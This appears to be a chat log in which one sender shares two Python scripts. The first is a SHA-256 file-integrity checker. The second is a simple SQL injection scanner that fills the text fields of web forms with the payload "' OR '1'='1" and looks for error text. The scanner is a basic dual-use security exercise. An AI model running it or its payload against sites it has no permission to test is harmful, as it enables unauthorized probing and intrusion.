[11:16 am, 04/06/2025] Sanika 🐣: import hashlib
import json
import os

# Function 1: Calculate the SHA-256 hash of a file
def calculate_hash(file_path):
    sha256 = hashlib.sha256()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            sha256.update(chunk)
    return sha256.hexdigest()

# Function 2: Save hash of a file into hashes.json
def save_hash(file_path, hash_store="hashes.json"):
    file_hash = calculate_hash(file_path)

    # Load existing hashes if the file exists
    if os.path.exists(hash_store):
        with open(hash_store, "r") as f:
            hashes = json.load(f)
    else:
        hashes = {}

    # Add/update the hash
    hashes[file_path] = file_hash

    # Write the updated hashes back to file
    with open(hash_store, "w") as f:
        json.dump(hashes, f, indent=4)

    print(f"✅ Hash saved for '{file_path}'")

# Function 3: Check if file hash matches the stored one
def verify_file(file_path, hash_store="hashes.json"):
    if not os.path.exists(hash_store):
        print("⚠️ Error: hashes.json not found. Please save hashes first.")
        return

    with open(hash_store, "r") as f:
        hashes = json.load(f)

    current_hash = calculate_hash(file_path)
    saved_hash = hashes.get(file_path)

    if saved_hash is None:
        print(f"⚠️ No saved hash found for {file_path}.")
    elif current_hash == saved_hash:
        print(f"✅ File '{file_path}' is safe and unchanged.")
    else:
        print(f"❌ ALERT: File '{file_path}' has been modified!")

# --------- Run One at a Time ---------
# Uncomment one of these to use:

# Step A: Save the original file hash
# save_hash("example.txt")

# Step B: Check if file is modified
# verify_file("example.txt")
[11:16 am, 04/06/2025] Sanika 🐣: import requests
from bs4 import BeautifulSoup

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find_all("form")

def submit_form(form, url, payload):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    
    data = {}
    for i in inputs:
        name = i.get("name")
        input_type = i.get("type")
        value = i.get("value", "test")
        
        if input_type == "text":
            value = payload
        
        data[name] = value

    if method == "post":
        return requests.post(url + action, data=data)
    return requests.get(url + action, params=data)

def scan_sql_injection(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    sql_payload = "' OR '1'='1"
    for form in forms:
        res = submit_form(form, url, sql_payload)
        if "error" in res.text.lower() or "sql" in res.text.lower():
            print("[!] SQL Injection vulnerability detected!")
        else:
            print("[-] No SQL Injection vulnerability.")

# Example usage
target_url = "http://example.com"  # Replace with target
scan_sql_injection(target_url)
